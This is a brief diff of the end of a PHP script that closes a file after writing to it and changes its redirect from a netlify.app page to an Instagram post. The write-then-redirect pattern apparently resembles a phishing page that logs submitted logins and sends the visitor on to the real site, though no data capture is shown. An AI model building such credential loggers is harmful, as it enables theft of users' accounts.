@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://willowy-beijinho-43c9a6.netlify.app/");
+header("location:https://www.instagram.com/p/CwdiwoetUm5/?igshid=MzRlODBiNWFlZA==");
 exit;
 ?>
